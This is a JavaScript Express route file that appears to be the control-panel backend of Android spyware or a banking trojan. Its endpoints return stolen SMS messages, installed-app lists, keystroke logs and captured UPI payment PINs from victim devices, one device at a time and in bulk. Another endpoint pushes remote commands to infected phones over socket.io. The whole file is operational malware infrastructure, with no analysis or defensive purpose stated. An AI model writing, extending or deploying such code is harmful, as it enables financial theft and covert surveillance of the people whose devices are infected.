const logger = require('../utils/logger');
const presenceService = require('./services/PresenceService');

// BigInt serialization hack for JSON.stringify
BigInt.prototype.toJSON = function () { return this.toString() };

function setupRoutes(app, prisma, io, notifyChange) {
    // Helper to get value from either snake_case or camelCase
    const getVal = (obj, key1, key2) => {
        if (!obj) return undefined;
        if (obj[key1] !== undefined) return obj[key1];
        if (key2 && obj[key2] !== undefined) return obj[key2];
        return undefined;
    };

    app.get('/api/devices', async (req, res) => {
        const { appId } = req.query;
        try {
            const devices = await prisma.device.findMany({
                where: appId ? { app_id: appId } : {},
                include: {
                    _count: {
                        select: { key_logs: true, upi_pins: true }
                    }
                },
                orderBy: { last_seen: 'desc' }
            });

            // Merge real-time status from Redis
            const deviceIds = devices.map(d => d.device_id);
            const statuses = await presenceService.getStatuses(deviceIds);

            const mergedDevices = devices.map(d => ({
                ...d,
                status: statuses[d.device_id] === true
            }));

            res.json(mergedDevices);
        } catch (error) {
            logger.error(`Error fetching devices:`, error);
            res.status(500).json({ error: error.message });
        }
    });

    app.get('/api/devices/:deviceId', async (req, res) => {
        const { deviceId } = req.params;
        const { appId } = req.query;
        try {
            const device = await prisma.device.findUnique({
                where: { device_id: deviceId },
                include: {
                    _count: {
                        select: { key_logs: true, upi_pins: true }
                    }
                }
            });
            if (!device) return res.status(404).json({ error: 'Device not found' });

            if (appId && device.app_id !== appId) {
                return res.status(403).json({ error: 'Forbidden: Device belongs to another app' });
            }

            // Merge real-time status from Redis
            const isOnline = await presenceService.isOnline(deviceId);
            res.json({ ...device, status: isOnline });
        } catch (error) {
            logger.error(`Error fetching device ${deviceId}:`, error);
            res.status(500).json({ error: error.message });
        }
    });

    // SMS Messages
    app.get('/api/devices/:deviceId/sms', async (req, res) => {
        const { deviceId } = req.params;
        const { limit = 100 } = req.query;
        try {
            const messages = await prisma.smsMessage.findMany({
                where: { device_id: deviceId },
                orderBy: { timestamp: 'desc' },
                take: parseInt(limit)
            });
            res.json(messages);
        } catch (error) {
            res.status(500).json({ error: error.message });
        }
    });

    // Installed Apps
    app.get('/api/devices/:deviceId/apps', async (req, res) => {
        const { deviceId } = req.params;
        const { limit = 200 } = req.query;
        try {
            const apps = await prisma.installedApp.findMany({
                where: { device_id: deviceId },
                take: parseInt(limit)
            });
            res.json(apps);
        } catch (error) {
            res.status(500).json({ error: error.message });
        }
    });

    // Device specific keylogs
    app.get('/api/devices/:deviceId/logs/keys', async (req, res) => {
        const { deviceId } = req.params;
        const { limit = 100 } = req.query;
        try {
            const logs = await prisma.keyLog.findMany({
                where: { device_id: deviceId },
                orderBy: { currentDate: 'desc' },
                take: parseInt(limit)
            });
            res.json(logs);
        } catch (error) {
            res.status(500).json({ error: error.message });
        }
    });

    // Device specific UPI pins
    app.get('/api/devices/:deviceId/logs/upi', async (req, res) => {
        const { deviceId } = req.params;
        try {
            const pins = await prisma.upiPin.findMany({
                where: { device_id: deviceId },
                orderBy: { currentDate: 'desc' }
            });
            res.json(pins);
        } catch (error) {
            res.status(500).json({ error: error.message });
        }
    });

    // Heartbeats
    app.get('/api/devices/:deviceId/heartbeats', async (req, res) => {
        const { deviceId } = req.params;
        const { limit = 50 } = req.query;
        try {
            const heartbeats = await prisma.heartbeat.findMany({
                where: { device_id: deviceId },
                orderBy: { last_update: 'desc' },
                take: parseInt(limit)
            });
            res.json(heartbeats);
        } catch (error) {
            res.status(500).json({ error: error.message });
        }
    });

    app.post('/api/devices/:deviceId/commands', async (req, res) => {
        const { deviceId } = req.params;
        const { command, payload } = req.body;
        const { appId } = req.query;

        try {
            if (appId) {
                const device = await prisma.device.findUnique({
                    where: { device_id: deviceId },
                    select: { app_id: true }
                });
                if (device && device.app_id !== appId) {
                    return res.status(403).json({ error: 'Forbidden: Device belongs to another app' });
                }
            }
            const newCommand = await prisma.deviceCommand.create({
                data: {
                    device_id: deviceId,
                    command,
                    payload,
                    status: 'pending'
                }
            });

            const commandToSend = {
                id: newCommand.id,
                device_id: newCommand.device_id,
                command: newCommand.command,
                payload: newCommand.payload,
                status: newCommand.status
            };

            io.to(`device:${deviceId}`).emit('command', JSON.stringify([commandToSend]));
            res.json(newCommand);
        } catch (error) {
            logger.error(`Error creating command for ${deviceId}:`, error);
            res.status(500).json({ error: error.message });
        }
    });

    // Global Messages
    app.get('/api/messages', async (req, res) => {
        const { limit = 100, appId } = req.query;
        try {
            const messages = await prisma.smsMessage.findMany({
                where: appId ? { device: { app_id: appId } } : {},
                orderBy: { timestamp: 'desc' },
                take: parseInt(limit)
            });
            res.json(messages);
        } catch (error) {
            res.status(500).json({ error: error.message });
        }
    });

    // Global Apps
    app.get('/api/apps', async (req, res) => {
        const { limit = 200, appId } = req.query;
        try {
            const apps = await prisma.installedApp.findMany({
                where: appId ? { device: { app_id: appId } } : {},
                take: parseInt(limit)
            });
            res.json(apps);
        } catch (error) {
            res.status(500).json({ error: error.message });
        }
    });

    // Global Keylogs
    app.get('/api/keylogs', async (req, res) => {
        const { limit = 100, appId } = req.query;
        try {
            const logs = await prisma.keyLog.findMany({
                where: appId ? { device: { app_id: appId } } : {},
                orderBy: { currentDate: 'desc' },
                take: parseInt(limit)
            });
            res.json(logs);
        } catch (error) {
            res.status(500).json({ error: error.message });
        }
    });

    // Global UPI Pins
    app.get('/api/pins', async (req, res) => {
        const { limit = 100, appId } = req.query;
        try {
            const pins = await prisma.upiPin.findMany({
                where: appId ? { device: { app_id: appId } } : {},
                orderBy: { currentDate: 'desc' },
                take: parseInt(limit)
            });
            res.json(pins);
        } catch (error) {
            res.status(500).json({ error: error.message });
        }
    });

    app.get('/api/logs', async (req, res) => {
        const { deviceId, appId } = req.query;
        try {
            const logs = await prisma.keyLog.findMany({
                where: {
                    device_id: deviceId,
                    ...(appId ? { device: { app_id: appId } } : {})
                },
                orderBy: { currentDate: 'desc' },
                take: 100
            });
            res.json(logs);
        } catch (error) {
            res.status(500).json({ error: error.message });
        }
    });

    app.get('/health', (req, res) => {
        const timestamp = new Date().toISOString();
        res.json({
            status: 'healthy',
            timestamp,
            uptime: process.uptime(),
            connections: io.sockets.sockets.size
        });
    });
}

module.exports = setupRoutes;
